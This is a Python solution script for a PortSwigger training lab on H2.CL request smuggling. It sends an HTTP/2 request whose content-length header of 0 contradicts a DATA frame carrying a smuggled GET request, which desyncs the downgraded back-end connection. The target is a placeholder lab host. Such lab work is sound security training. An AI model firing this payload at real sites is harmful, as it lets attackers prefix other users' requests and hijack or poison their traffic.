"""
Lab 13: H2.CL request smuggling
https://portswigger.net/web-security/request-smuggling/advanced/h2-cl-request-smuggling
Difficulty: Practitioner

📝 The front-end speaks HTTP/2 to us but downgrades to HTTP/1.1 to reach
the back-end. HTTP/2 doesn't use Content-Length to frame the body (DATA
frame length does that) — but if we SEND a Content-Length header anyway
and it disagrees with the actual DATA frame size, the downgrade step has
to pick one, and the back-end's resulting HTTP/1.1 request can end up
desynced exactly like classic CL.TE.

Requires: pip install h2 --break-system-packages
"""

from utils import open_h2_via_burp, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"


def run():
    tls_sock, conn = open_h2_via_burp(HOST)

    # Declare Content-Length: 0 but actually send a DATA frame with a
    # smuggled request's worth of bytes — the downgraded HTTP/1.1 request
    # the back-end sees ends up with a body the front-end never accounted for.
    smuggled_body = (
        b"GET /404 HTTP/1.1\r\n"
        b"Host: " + HOST.encode() + b"\r\n"
        b"X-Ignore: X\r\n\r\n"
    )

    headers = [
        (":method", "POST"),
        (":authority", HOST),
        (":scheme", "https"),
        (":path", "/"),
        ("content-length", "0"),  # lies about the body being empty
    ]

    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers, end_stream=False)
    conn.send_data(stream_id, smuggled_body, end_stream=True)
    tls_sock.sendall(conn.data_to_send())

    note("Sent HTTP/2 request with Content-Length: 0 but a non-empty DATA")
    note("frame — if the downgrade trusts the header over the frame length,")
    note("the smuggled GET /404 becomes a prefix for whatever request")
    note("follows on the back-end's HTTP/1.1 connection.")

    tls_sock.settimeout(5)
    try:
        while True:
            data = tls_sock.recv(4096)
            if not data:
                break
            events = conn.receive_data(data)
            for event in events:
                log(f"Event: {event}")
    except Exception as e:
        log(f"Read loop ended: {e}")


if __name__ == "__main__":
    run()
